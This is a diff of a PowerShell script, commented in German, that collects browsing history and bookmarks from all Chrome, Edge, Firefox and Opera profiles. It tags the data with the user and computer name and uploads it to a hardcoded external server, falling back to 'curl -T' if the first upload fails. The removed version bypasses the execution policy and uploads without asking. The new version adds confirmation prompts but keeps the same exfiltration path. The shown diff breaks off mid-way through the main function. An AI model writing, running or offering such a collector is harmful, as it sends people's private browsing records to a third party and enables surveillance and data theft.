@@ -1,365 +1,731 @@
-# Temporär deaktivieren der Ausführungsrichtlinie für diese Session (falls benötigt)
-Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
+[CmdletBinding(SupportsShouldProcess = $true, ConfirmImpact = 'High')]
+param (
+    [Parameter(Mandatory = $true)]
+    [ValidateSet('chrome', 'edge', 'firefox', 'opera')]
+    [string[]]$Browser,
+    
+    [Parameter(Mandatory = $true)]
+    [ValidateSet('history', 'bookmarks')]
+    [string[]]$DataType,
+    
+    [Parameter()]
+    [switch]$SkipUpload,
+    
+    [Parameter()]
+    [string]$UploadUrl = "https://file-transfer.jokerdev.tech/upload",
+    
+    [Parameter()]
+    [switch]$DryRun,
+    
+    [Parameter()]
+    [switch]$Force
+)
 
-function Get-BrowserData {
+# Strict Mode für bessere Fehlererkennung
+Set-StrictMode -Version 3.0
+
+# Modul für SQLite (nur für Firefox History)
+$useSQLite = $false
+try {
+    Add-Type -Path "$PSScriptRoot\System.Data.SQLite.dll" -ErrorAction Stop
+    $useSQLite = $true
+    Write-Verbose "SQLite-Unterstützung aktiviert"
+} catch {
+    Write-Verbose "SQLite-Bibliothek nicht verfügunde, Firefox History wird eingeschränkt unterstützt"
+}
+
+# ==============================================
+# MODULE: Path Resolver
+# ==============================================
+function Get-BrowserPaths {
     [CmdletBinding()]
-    param (	
-        [Parameter(Position = 1, Mandatory = $True)]
-        [string]$Browser,    
-        [Parameter(Position = 2, Mandatory = $True)]
-        [string]$DataType 
+    [OutputType([System.Collections.Hashtable])]
+    param(
+        [Parameter(Mandatory)]
+        [ValidateSet('chrome', 'edge', 'firefox', 'opera')]
+        [string]$Browser,
+        
+        [Parameter(Mandatory)]
+        [ValidateSet('history', 'bookmarks')]
+        [string]$DataType
     )
-
-    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
-    $Results = @()
-
-    # Chrome
-    if ($Browser -eq 'chrome') {
-        # Suche alle Chrome Profile
-        $chromeProfiles = Get-ChildItem "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\*" -Directory | 
-                         Where-Object { $_.Name -match "Default|Profile" }
-        
-        foreach ($profile in $chromeProfiles) {
-            if ($DataType -eq 'history') {
-                $Path = "$($profile.FullName)\History"
-            }
-            elseif ($DataType -eq 'bookmarks') {
-                $Path = "$($profile.FullName)\Bookmarks"
-            }
-            
-            if (Test-Path $Path) {
-                Write-Host "Chrome $DataType gefunden in: $Path" -ForegroundColor Green
-                try {
-                    # Versuche, die Datei zu kopieren, falls sie gesperrt ist
-                    $tempFile = "$env:TEMP\chrome_temp"
-                    Copy-Item -Path $Path -Destination $tempFile -Force -ErrorAction SilentlyContinue
-                    
-                    if (Test-Path $tempFile) {
-                        $content = Get-Content -Path $tempFile -Raw -ErrorAction SilentlyContinue
-                        if ($content) {
-                            $matches = [regex]::Matches($content, $Regex)
-                            foreach ($match in $matches) {
-                                $Results += New-Object -TypeName PSObject -Property @{
-                                    User = $env:UserName
-                                    Browser = $Browser
-                                    DataType = $DataType
-                                    Profile = $profile.Name
-                                    Data = $match.Value
-                                }
-                            }
-                        }
-                        Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue
-                    }
-                }
-                catch {
-                    Write-Warning "Fehler beim Lesen von $Path : $_"
-                }
-            }
+    
+    $paths = [System.Collections.Generic.List[string]]::new()
+    $basePaths = @{
+        chrome = @{
+            history   = @('\History')
+            bookmarks = @('\Bookmarks')
+            base      = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
+        }
+        edge = @{
+            history   = @('\History')
+            bookmarks = @('\Bookmarks')
+            base      = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data"
+        }
+        firefox = @{
+            history   = @('\places.sqlite')
+            bookmarks = @('\bookmarks.json')
+            base      = "$env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles"
+        }
+        opera = @{
+            history   = @('\History', '\Opera Stable\History', '\Opera GX Stable\History')
+            bookmarks = @('\Bookmarks', '\Opera Stable\Bookmarks', '\Opera GX Stable\Bookmarks')
+            base      = "$env:USERPROFILE\AppData\Roaming\Opera Software"
         }
     }
     
-    # Microsoft Edge (funktioniert ähnlich wie Chrome)
-    elseif ($Browser -eq 'edge') {
-        # Suche alle Edge Profile
-        $edgeProfiles = Get-ChildItem "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\*" -Directory | 
-                       Where-Object { $_.Name -match "Default|Profile" }
-        
-        foreach ($profile in $edgeProfiles) {
-            if ($DataType -eq 'history') {
-                $Path = "$($profile.FullName)\History"
-            }
-            elseif ($DataType -eq 'bookmarks') {
-                $Path = "$($profile.FullName)\Bookmarks"
-            }
-            
-            if (Test-Path $Path) {
-                Write-Host "Edge $DataType gefunden in: $Path" -ForegroundColor Green
-                try {
-                    $tempFile = "$env:TEMP\edge_temp"
-                    Copy-Item -Path $Path -Destination $tempFile -Force -ErrorAction SilentlyContinue
-                    
-                    if (Test-Path $tempFile) {
-                        $content = Get-Content -Path $tempFile -Raw -ErrorAction SilentlyContinue
-                        if ($content) {
-                            $matches = [regex]::Matches($content, $Regex)
-                            foreach ($match in $matches) {
-                                $Results += New-Object -TypeName PSObject -Property @{
-                                    User = $env:UserName
-                                    Browser = $Browser
-                                    DataType = $DataType
-                                    Profile = $profile.Name
-                                    Data = $match.Value
-                                }
-                            }
-                        }
-                        Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue
-                    }
-                }
-                catch {
-                    Write-Warning "Fehler beim Lesen von $Path : $_"
-                }
-            }
-        }
+    if (-not $basePaths.ContainsKey($Browser)) {
+        Write-Error "Browser '$Browser' nicht unterstützt"
+        return @{}
     }
     
-    # Firefox
-    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history') {
-        # Finde Firefox Profile
-        $firefoxProfiles = Get-ChildItem "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*" -Directory
-        
-        foreach ($profile in $firefoxProfiles) {
-            $Path = "$($profile.FullName)\places.sqlite"
-            
-            if (Test-Path $Path) {
-                Write-Host "Firefox History gefunden in: $Path" -ForegroundColor Green
-                try {
-                    $tempFile = "$env:TEMP\firefox_temp"
-                    Copy-Item -Path $Path -Destination $tempFile -Force -ErrorAction SilentlyContinue
-                    
-                    if (Test-Path $tempFile) {
-                        $content = Get-Content -Path $tempFile -Raw -Encoding Byte | 
-                                   ForEach-Object { [char]$_ } | 
-                                   Out-String -ErrorAction SilentlyContinue
-                        
-                        if ($content) {
-                            $matches = [regex]::Matches($content, $Regex)
-                            foreach ($match in $matches) {
-                                $Results += New-Object -TypeName PSObject -Property @{
-                                    User = $env:UserName
-                                    Browser = $Browser
-                                    DataType = $DataType
-                                    Profile = $profile.Name
-                                    Data = $match.Value
-                                }
-                            }
-                        }
-                        Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue
-                    }
-                }
-                catch {
-                    Write-Warning "Fehler beim Lesen von $Path : $_"
-                }
-            }
-        }
-    }
+    $config = $basePaths[$Browser]
     
-    # Opera
-    elseif ($Browser -eq 'opera') {
-        # Standard Opera
-        if ($DataType -eq 'history') {
-            $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera Stable\History"
-        }
-        elseif ($DataType -eq 'bookmarks') {
-            $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera Stable\Bookmarks"
-        }
-        
-        # Opera GX (falls installiert)
-        if (-not (Test-Path $Path)) {
-            if ($DataType -eq 'history') {
-                $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
-            }
-            elseif ($DataType -eq 'bookmarks') {
-                $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
-            }
-        }
-        
-        if (Test-Path $Path) {
-            Write-Host "Opera $DataType gefunden in: $Path" -ForegroundColor Green
-            try {
-                $tempFile = "$env:TEMP\opera_temp"
-                Copy-Item -Path $Path -Destination $tempFile -Force -ErrorAction SilentlyContinue
+    switch ($Browser) {
+        { $_ -in 'chrome', 'edge' } {
+            # Finde alle Profile
+            if (Test-Path $config.base) {
+                $profiles = Get-ChildItem -Path $config.base -Directory -Filter "*" -ErrorAction SilentlyContinue | 
+                           Where-Object { $_.Name -match "^(Default|Profile \d+)$" }
                 
-                if (Test-Path $tempFile) {
-                    $content = Get-Content -Path $tempFile -Raw -ErrorAction SilentlyContinue
-                    if ($content) {
-                        $matches = [regex]::Matches($content, $Regex)
+                foreach ($profile in $profiles) {
+                    $dataPath = $config[$DataType]
+                    $fullPath = Join-Path $profile.FullName $dataPath[0]
+                    if (Test-Path $fullPath) {
+                        $paths.Add($fullPath)
+                    }
+                }
+            }
+        }
+        
+        'firefox' {
+            # Firefox Profile
+            if (Test-Path $config.base) {
+                $profiles = Get-ChildItem -Path $config.base -Directory -ErrorAction SilentlyContinue
+                foreach ($profile in $profiles) {
+                    $fullPath = Join-Path $profile.FullName $config[$DataType][0]
+                    if (Test-Path $fullPath) {
+                        $paths.Add($fullPath)
+                    }
+                }
+            }
+        }
+        
+        'opera' {
+            # Opera Varianten
+            foreach ($relativePath in $config[$DataType]) {
+                $fullPath = Join-Path $config.base $relativePath.TrimStart('\')
+                if (Test-Path $fullPath) {
+                    $paths.Add($fullPath)
+                }
+            }
+        }
+    }
+    
+    return @{
+        Browser = $Browser
+        DataType = $DataType
+        Paths = $paths
+    }
+}
+
+# ==============================================
+# MODULE: File Access Handler
+# ==============================================
+function Read-BrowserFile {
+    [CmdletBinding()]
+    [OutputType([string])]
+    param(
+        [Parameter(Mandatory)]
+        [string]$FilePath,
+        
+        [Parameter(Mandatory)]
+        [string]$DataType,
+        
+        [Parameter(Mandatory)]
+        [string]$Browser
+    )
+    
+    $tempFile = $null
+    try {
+        Write-Verbose "Lese Datei: $FilePath"
+        
+        # Versuche direkten Zugriff
+        if ($DryRun) {
+            Write-Output "[DRY-RUN] Würde lesen: $FilePath"
+            return $null
+        }
+        
+        try {
+            # Direktes Lesen versuchen
+            $content = Get-Content -Path $FilePath -Raw -ErrorAction Stop
+            return $content
+        }
+        catch [System.IO.IOException] {
+            # Datei ist gesperrt - kopieren in TEMP
+            Write-Verbose "Datei gesperrt, kopiere zu TEMP..."
+            $tempFile = Join-Path $env:TEMP ([System.Guid]::NewGuid().ToString())
+            Copy-Item -Path $FilePath -Destination $tempFile -Force -ErrorAction Stop
+            
+            # Prüfe Dateigröße (Verhindert Memory Issues)
+            $fileSize = (Get-Item $tempFile).Length / 1MB
+            if ($fileSize -gt 100) {
+                Write-Warning "Datei ist sehr groß ($($fileSize) MB), Verarbeitung kann Speicherintensiv sein"
+            }
+            
+            $content = Get-Content -Path $tempFile -Raw -ErrorAction Stop
+            return $content
+        }
+    }
+    catch {
+        Write-Warning "Fehler beim Lesen von $FilePath : $($_.Exception.Message)"
+        return $null
+    }
+    finally {
+        # Temp-File aufräumen
+        if ($tempFile -and (Test-Path $tempFile)) {
+            Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue
+        }
+    }
+}
+
+# ==============================================
+# MODULE: Data Parser
+# ==============================================
+function Parse-BrowserData {
+    [CmdletBinding()]
+    [OutputType([System.Collections.Generic.List[PSCustomObject]])]
+    param(
+        [Parameter(Mandatory)]
+        [string]$Content,
+        
+        [Parameter(Mandatory)]
+        [string]$DataType,
+        
+        [Parameter(Mandatory)]
+        [string]$Browser,
+        
+        [Parameter(Mandatory)]
+        [string]$SourcePath
+    )
+    
+    $results = [System.Collections.Generic.List[PSCustomObject]]::new()
+    
+    if ([string]::IsNullOrWhiteSpace($Content)) {
+        return $results
+    }
+    
+    try {
+        switch ($Browser) {
+            { $_ -in 'chrome', 'edge', 'opera' } {
+                if ($DataType -eq 'history') {
+                    # Verbesserte URL-Erkennung
+                    $urlPattern = 'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+[^\s"\'<>]*'
+                    $matches = [regex]::Matches($Content, $urlPattern, [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
+                    
+                    foreach ($match in $matches) {
+                        $url = $match.Value.Trim()
+                        # Filtere interne URLs
+                        if ($url -match '^(chrome|edge|opera|about|file|data):' -or 
+                            $url.Length -lt 10) {
+                            continue
+                        }
+                        
+                        $results.Add([PSCustomObject]@{
+                            Url = $url
+                            Source = $SourcePath
+                            Timestamp = [datetime]::Now
+                        })
+                    }
+                }
+                elseif ($DataType -eq 'bookmarks') {
+                    # Chrome/Edge Bookmarks sind JSON
+                    try {
+                        $bookmarks = $Content | ConvertFrom-Json -ErrorAction Stop
+                        Extract-Bookmarks -Node $bookmarks.roots -Results $results -SourcePath $SourcePath
+                    }
+                    catch {
+                        # Fallback: Regex für Bookmarks
+                        $urlPattern = '"url"\s*:\s*"([^"]+)"'
+                        $matches = [regex]::Matches($Content, $urlPattern)
+                        
                         foreach ($match in $matches) {
-                            $Results += New-Object -TypeName PSObject -Property @{
-                                User = $env:UserName
-                                Browser = $Browser
-                                DataType = $DataType
-                                Profile = "Default"
-                                Data = $match.Value
+                            $url = $match.Groups[1].Value
+                            if ($url -notmatch '^(chrome|edge|opera|about):') {
+                                $results.Add([PSCustomObject]@{
+                                    Url = $url
+                                    Source = $SourcePath
+                                    Timestamp = [datetime]::Now
+                                    Type = 'Bookmark'
+                                })
                             }
                         }
                     }
-                    Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue
+                }
+            }
+            
+            'firefox' {
+                if ($DataType -eq 'history' -and $useSQLite) {
+                    # SQLite-basierte Verarbeitung
+                    $results.AddRange((Parse-FirefoxHistory -Content $Content -SourcePath $SourcePath))
+                }
+                elseif ($DataType -eq 'bookmarks') {
+                    # Firefox Bookmarks JSON
+                    $urlPattern = '"uri"\s*:\s*"([^"]+)"'
+                    $matches = [regex]::Matches($Content, $urlPattern)
+                    
+                    foreach ($match in $matches) {
+                        $url = $match.Groups[1].Value
+                        $results.Add([PSCustomObject]@{
+                            Url = $url
+                            Source = $SourcePath
+                            Timestamp = [datetime]::Now
+                            Type = 'Bookmark'
+                        })
+                    }
+                }
+            }
+        }
+    }
+    catch {
+        Write-Warning "Fehler beim Parsen der Daten: $($_.Exception.Message)"
+    }
+    
+    return $results
+}
+
+function Extract-Bookmarks {
+    param(
+        $Node,
+        [System.Collections.Generic.List[PSCustomObject]]$Results,
+        [string]$SourcePath
+    )
+    
+    if ($Node.PSObject.Properties['url']) {
+        $url = $Node.url
+        if ($url -and $url -notmatch '^(chrome|edge|opera|about):') {
+            $Results.Add([PSCustomObject]@{
+                Url = $url
+                Source = $SourcePath
+                Timestamp = [datetime]::Now
+                Type = 'Bookmark'
+                Title = $Node.name
+            })
+        }
+    }
+    
+    if ($Node.PSObject.Properties['children']) {
+        foreach ($child in $Node.children) {
+            Extract-Bookmarks -Node $child -Results $Results -SourcePath $SourcePath
+        }
+    }
+}
+
+function Parse-FirefoxHistory {
+    param([string]$Content, [string]$SourcePath)
+    
+    $results = [System.Collections.Generic.List[PSCustomObject]]::new()
+    
+    try {
+        # Erstelle temporäre Kopie für SQLite
+        $tempDb = Join-Path $env:TEMP ([System.Guid]::NewGuid().ToString() + ".sqlite")
+        [System.IO.File]::WriteAllBytes($tempDb, [System.Text.Encoding]::UTF8.GetBytes($Content))
+        
+        $connectionString = "Data Source=$tempDb;Version=3;Read Only=True;"
+        $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
+        $connection.Open()
+        
+        $command = $connection.CreateCommand()
+        $command.CommandText = @"
+            SELECT url, title, last_visit_date/1000000 as visit_time 
+            FROM moz_places 
+            WHERE url LIKE 'http%' 
+            ORDER BY last_visit_date DESC
+"@
+        
+        $reader = $command.ExecuteReader()
+        while ($reader.Read()) {
+            $url = $reader["url"].ToString()
+            $results.Add([PSCustomObject]@{
+                Url = $url
+                Source = $SourcePath
+                Timestamp = [datetime]::Now
+                Title = $reader["title"].ToString()
+            })
+        }
+        
+        $reader.Close()
+        $connection.Close()
+    }
+    catch {
+        Write-Warning "SQLite-Verarbeitung fehlgeschlagen: $($_.Exception.Message)"
+    }
+    finally {
+        if ($tempDb -and (Test-Path $tempDb)) {
+            Remove-Item -Path $tempDb -Force -ErrorAction SilentlyContinue
+        }
+    }
+    
+    return $results
+}
+
+# ==============================================
+# MODULE: Data Aggregator
+# ==============================================
+function Get-BrowserData {
+    [CmdletBinding(SupportsShouldProcess)]
+    [OutputType([System.Collections.Generic.List[PSCustomObject]])]
+    param(
+        [Parameter(Mandatory)]
+        [ValidateSet('chrome', 'edge', 'firefox', 'opera')]
+        [string]$Browser,
+        
+        [Parameter(Mandatory)]
+        [ValidateSet('history', 'bookmarks')]
+        [string]$DataType,
+        
+        [switch]$Force
+    )
+    
+    $allResults = [System.Collections.Generic.List[PSCustomObject]]::new()
+    
+    # Bestätigung für Datenerfassung
+    $action = "Browser-Daten sammeln ($Browser - $DataType)"
+    if ($PSCmdlet.ShouldProcess($action, "Fortfahren?", "Datenerfassung")) {
+        if (-not $Force -and -not $PSCmdlet.ShouldContinue($action, "Diese Aktion liest private Browser-Daten")) {
+            Write-Verbose "Vom Benutzer abgebrochen"
+            return $allResults
+        }
+        
+        # Pfade ermitteln
+        $paths = Get-BrowserPaths -Browser $Browser -DataType $DataType
+        
+        if ($paths.Paths.Count -eq 0) {
+            Write-Verbose "Keine Dateien für $Browser $DataType gefunden"
+            return $allResults
+        }
+        
+        Write-Verbose "Verarbeite $($paths.Paths.Count) Dateien für $Browser $DataType"
+        
+        foreach ($filePath in $paths.Paths) {
+            try {
+                # Datei lesen
+                $content = Read-BrowserFile -FilePath $filePath -DataType $DataType -Browser $Browser
+                if (-not $content) { continue }
+                
+                # Daten parsen
+                $parsedResults = Parse-BrowserData -Content $content -DataType $DataType -Browser $Browser -SourcePath $filePath
+                
+                # Ergebnisse hinzufügen
+                foreach ($result in $parsedResults) {
+                    $result.PSObject.Properties.Add([psnoteproperty]::new('Browser', $Browser))
+                    $result.PSObject.Properties.Add([psnoteproperty]::new('DataType', $DataType))
+                    $result.PSObject.Properties.Add([psnoteproperty]::new('User', $env:USERNAME))
+                    $result.PSObject.Properties.Add([psnoteproperty]::new('Computer', $env:COMPUTERNAME))
+                    
+                    $allResults.Add($result)
                 }
             }
             catch {
-                Write-Warning "Fehler beim Lesen von $Path : $_"
+                Write-Warning "Fehler bei $filePath : $($_.Exception.Message)"
             }
         }
     }
     
-    return $Results
+    return $allResults
 }
 
-# Debug-Funktion zum Überprüfen der Browser-Installationen
-function Check-BrowserInstallations {
-    Write-Host "`n=== Prüfe Browser-Installationen ===" -ForegroundColor Cyan
-    
-    # Chrome
-    $chromePath = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
-    if (Test-Path $chromePath) {
-        Write-Host "[✓] Chrome gefunden" -ForegroundColor Green
-        $profiles = Get-ChildItem $chromePath -Directory | Where-Object { $_.Name -match "Default|Profile" }
-        Write-Host "    Profile: $($profiles.Count) gefunden" -ForegroundColor Yellow
-    } else {
-        Write-Host "[✗] Chrome nicht gefunden" -ForegroundColor Red
-    }
-    
-    # Edge
-    $edgePath = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data"
-    if (Test-Path $edgePath) {
-        Write-Host "[✓] Edge gefunden" -ForegroundColor Green
-        $profiles = Get-ChildItem $edgePath -Directory | Where-Object { $_.Name -match "Default|Profile" }
-        Write-Host "    Profile: $($profiles.Count) gefunden" -ForegroundColor Yellow
-    } else {
-        Write-Host "[✗] Edge nicht gefunden" -ForegroundColor Red
-    }
-    
-    # Firefox
-    $firefoxPath = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles"
-    if (Test-Path $firefoxPath) {
-        Write-Host "[✓] Firefox gefunden" -ForegroundColor Green
-        $profiles = Get-ChildItem $firefoxPath -Directory
-        Write-Host "    Profile: $($profiles.Count) gefunden" -ForegroundColor Yellow
-    } else {
-        Write-Host "[✗] Firefox nicht gefunden" -ForegroundColor Red
-    }
-    
-    # Opera
-    $operaPaths = @(
-        "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera Stable",
-        "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable"
+# ==============================================
+# MODULE: Export & Upload
+# ==============================================
+function Export-BrowserData {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory, ValueFromPipeline)]
+        [PSCustomObject[]]$BrowserData,
+        
+        [Parameter(Mandatory)]
+        [string]$OutputPath,
+        
+        [ValidateSet('Json', 'Csv', 'Text')]
+        [string]$Format = 'Json'
     )
     
-    $operaFound = $false
-    foreach ($path in $operaPaths) {
-        if (Test-Path $path) {
-            Write-Host "[✓] Opera gefunden: $path" -ForegroundColor Green
-            $operaFound = $true
+    begin {
+        $allData = [System.Collections.Generic.List[PSCustomObject]]::new()
+    }
+    
+    process {
+        foreach ($item in $BrowserData) {
+            $allData.Add($item)
         }
     }
-    if (-not $operaFound) {
-        Write-Host "[✗] Opera nicht gefunden" -ForegroundColor Red
+    
+    end {
+        if ($allData.Count -eq 0) {
+            Write-Warning "Keine Daten zum Exportieren"
+            return $null
+        }
+        
+        # Deduplizierung
+        $uniqueData = $allData | Sort-Object -Property Url -Unique
+        
+        Write-Verbose "Exportiere $($uniqueData.Count) eindeutige Einträge nach $OutputPath"
+        
+        switch ($Format) {
+            'Json' {
+                $uniqueData | ConvertTo-Json -Depth 5 -Compress | Set-Content -Path $OutputPath -Encoding UTF8
+            }
+            'Csv' {
+                $uniqueData | Select-Object User, Computer, Browser, DataType, Url, Title, Source, Timestamp |
+                    Export-Csv -Path $OutputPath -Encoding UTF8 -NoTypeInformation
+            }
+            'Text' {
+                $report = @"
+Browser Data Report
+===================
+Erstellt: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+Benutzer: $env:USERNAME
+Computer: $env:COMPUTERNAME
+Einträge: $($uniqueData.Count)
+
+"@
+                
+                $grouped = $uniqueData | Group-Object -Property Browser, DataType
+                foreach ($group in $grouped) {
+                    $report += "`n=== $($group.Name) ===`n"
+                    foreach ($item in $group.Group) {
+                        $report += "  $($item.Url)`n"
+                        if ($item.Title) {
+                            $report += "    Titel: $($item.Title)`n"
+                        }
+                    }
+                }
+                
+                Set-Content -Path $OutputPath -Value $report -Encoding UTF8
+            }
+        }
+        
+        return $OutputPath
     }
 }
 
-# Upload-Funktion (vereinfacht)
-function Upload-File {
-    param($FilePath, $UploadUrl)
+function Invoke-FileUpload {
+    [CmdletBinding(SupportsShouldProcess)]
+    param(
+        [Parameter(Mandatory)]
+        [string]$FilePath,
+        
+        [Parameter(Mandatory)]
+        [string]$UploadUrl,
+        
+        [switch]$Force
+    )
     
-    try {
-        Write-Host "`nVersuche Upload von: $FilePath" -ForegroundColor Yellow
-        
-        # Methode 1: Mit .NET WebClient
-        $webClient = New-Object System.Net.WebClient
-        $fileName = Split-Path $FilePath -Leaf
-        
-        # Stelle sicher, dass die URL korrekt ist
-        if (-not $UploadUrl.EndsWith("/")) {
-            $UploadUrl = $UploadUrl.TrimEnd('/')
-        }
-        $fullUrl = "$UploadUrl/$fileName"
-        
-        Write-Host "Upload-URL: $fullUrl" -ForegroundColor Cyan
-        $webClient.UploadFile($fullUrl, $FilePath)
-        
-        Write-Host "[✓] Upload erfolgreich!" -ForegroundColor Green
-        return $true
-    }
-    catch {
-        Write-Host "[✗] Upload fehlgeschlagen: $_" -ForegroundColor Red
+    if (-not (Test-Path $FilePath)) {
+        Write-Error "Datei nicht gefunden: $FilePath"
         return $false
     }
-}
-
-# Hauptskript
-Write-Host "=== Browser Data Collector ===" -ForegroundColor Cyan
-Write-Host "Starte mit Benutzer: $env:USERNAME" -ForegroundColor Yellow
-
-# 1. Browser-Installationen prüfen
-Check-BrowserInstallations
-
-# 2. Browser-Daten sammeln
-$outputFile = "$env:TEMP\BrowserData.txt"
-$allData = @()
-
-Write-Host "`n=== Sammle Browser-Daten ===" -ForegroundColor Cyan
-
-$browsersToCheck = @(
-    @{Browser = "chrome"; DataType = "history"},
-    @{Browser = "chrome"; DataType = "bookmarks"},
-    @{Browser = "edge"; DataType = "history"},
-    @{Browser = "edge"; DataType = "bookmarks"},
-    @{Browser = "firefox"; DataType = "history"},
-    @{Browser = "opera"; DataType = "history"},
-    @{Browser = "opera"; DataType = "bookmarks"}
-)
-
-foreach ($item in $browsersToCheck) {
-    Write-Host "Prüfe: $($item.Browser) - $($item.DataType)" -ForegroundColor Gray
-    $data = Get-BrowserData -Browser $item.Browser -DataType $item.DataType
-    if ($data) {
-        Write-Host "  Gefunden: $($data.Count) Einträge" -ForegroundColor Green
-        $allData += $data
-    } else {
-        Write-Host "  Keine Daten gefunden" -ForegroundColor DarkGray
+    
+    if ($SkipUpload) {
+        Write-Verbose "Upload übersprungen (SkipUpload angegeben)"
+        return $true
     }
-}
-
-# 3. Daten speichern
-if ($allData.Count -gt 0) {
-    Write-Host "`nGesammelte Einträge: $($allData.Count)" -ForegroundColor Green
     
-    # Header
-    "Browser Data Report" | Out-File -FilePath $outputFile -Encoding UTF8
-    "====================" | Out-File -FilePath $outputFile -Encoding UTF8 -Append
-    "Erstellt: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" | Out-File -FilePath $outputFile -Encoding UTF8 -Append
-    "Benutzer: $env:USERNAME" | Out-File -FilePath $outputFile -Encoding UTF8 -Append
-    "Computer: $env:COMPUTERNAME" | Out-File -FilePath $outputFile -Encoding UTF8 -Append
-    "" | Out-File -FilePath $outputFile -Encoding UTF8 -Append
+    $fileName = Split-Path $FilePath -Leaf
+    $fullUrl = "$UploadUrl/$fileName"
     
-    # Daten gruppiert ausgeben
-    $groupedData = $allData | Group-Object -Property Browser
-    
-    foreach ($group in $groupedData) {
-        "=== $($group.Name.ToUpper()) ===" | Out-File -FilePath $outputFile -Encoding UTF8 -Append
+    $action = "Datei hochladen nach $fullUrl"
+    if ($PSCmdlet.ShouldProcess($action, "Fortfahren?", "Datei-Upload")) {
+        if (-not $Force -and -not $PSCmdlet.ShouldContinue($action, "Datei wird an externen Server gesendet")) {
+            return $false
+        }
         
-        $byType = $group.Group | Group-Object -Property DataType
-        foreach ($typeGroup in $byType) {
-            "  --- $($typeGroup.Name.ToUpper()) ---" | Out-File -FilePath $outputFile -Encoding UTF8 -Append
+        try {
+            Write-Verbose "Upload startet..."
             
-            $uniqueUrls = $typeGroup.Group.Data | Sort-Object -Unique
-            foreach ($url in $uniqueUrls) {
-                "  $url" | Out-File -FilePath $outputFile -Encoding UTF8 -Append
+            # Methode 1: WebClient
+            $webClient = New-Object System.Net.WebClient
+            $webClient.UploadFile($fullUrl, $FilePath)
+            
+            Write-Verbose "Upload erfolgreich"
+            return $true
+        }
+        catch {
+            Write-Error "Upload fehlgeschlagen: $($_.Exception.Message)"
+            
+            # Alternative: cURL falls verfügbar
+            try {
+                if (Get-Command curl -ErrorAction SilentlyContinue) {
+                    Write-Verbose "Versuche mit cURL..."
+                    curl -T $FilePath $fullUrl
+                    return $true
+                }
             }
-            "" | Out-File -FilePath $outputFile -Encoding UTF8 -Append
+            catch {
+                Write-Error "Auch cURL fehlgeschlagen"
+            }
+            
+            return $false
         }
     }
     
-    Write-Host "Daten gespeichert in: $outputFile" -ForegroundColor Green
-    
-    # 4. Datei hochladen
-    $uploadUrl = "https://file-transfer.jokerdev.tech/upload"
-    $success = Upload-File -FilePath $outputFile -UploadUrl $uploadUrl
-    
-    if (-not $success) {
-        Write-Host "`nTipp: Versuche diese Alternativen:" -ForegroundColor Yellow
-        Write-Host "1. Als Administrator ausführen" -ForegroundColor Yellow
-        Write-Host "2. Browser vorher schließen" -ForegroundColor Yellow
-        Write-Host "3. Manuell hochladen: curl -T `"$outputFile`" $uploadUrl/BrowserData.txt" -ForegroundColor Yellow
-    }
-} else {
-    Write-Host "`n[!] Keine Browser-Daten gefunden!" -ForegroundColor Red
-    Write-Host "Mögliche Lösungen:" -ForegroundColor Yellow
-    Write-Host "1. Skript als Administrator ausführen" -ForegroundColor Yellow
-    Write-Host "2. Stelle sicher, dass du im richtigen Benutzerprofil bist" -ForegroundColor Yellow
-    Write-Host "3. Browser vorher schließen" -ForegroundColor Yellow
-    Write-Host "4. Überprüfe ob Browser überhaupt installiert sind" -ForegroundColor Yellow
+    return $false
 }
 
-Write-Host "`nDrücke eine Taste zum Beenden..." -ForegroundColor Cyan
-$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+# ==============================================
+# MAIN SCRIPT
+# ==============================================
+function Main {
+    [CmdletBinding()]
+    param()
+    
+    Write-Host "`n=== PowerShell Browser Data Collector ===" -ForegroundColor Cyan
+    Write-Host "Benutzer: $env:USERNAME | Computer: $env:COMPUTERNAME" -ForegroundColor Gray
+    
+    if ($DryRun) {
+        Write-Host "DRY RUN MODE - Keine Daten werden gelesen oder gesendet" -ForegroundColor Yellow
+    }
+    
+    # Sammle alle angeforderten Daten
+    $allBrowserData = [System.Collections.Generic.List[PSCustomObject]]::new()
+    
+    foreach ($browser in $Browser) {
+        foreach ($dataType in $DataType) {
+            Write-Host "`nVerarbeite: $browser - $dataType" -ForegroundColor Cyan
+            
+            if ($browser -eq 'firefox' -and $dataType -eq 'bookmarks') {
+                Write-Warning "Firefox Bookmarks werden derzeit nicht vollständig unterstützt"
+                continue
+            }
+            
+            $data = Get-BrowserData -Browser $browser -DataType $dataType -Force:$Force
+            if ($data.Count -gt 0) {
+                Write-Host "  Gefunden: $($data.Count) Einträge" -ForegroundColor Green
+                $allBrowserData.AddRange($data)
+            }
+            else {
+                Write-Host "  Keine Daten gefunden" -ForegroundColor Gray
+            }
+        }
+    }
+    
+    # Ergebnisse verarbeiten
+    if ($allBrowserData.Count -eq 0) {
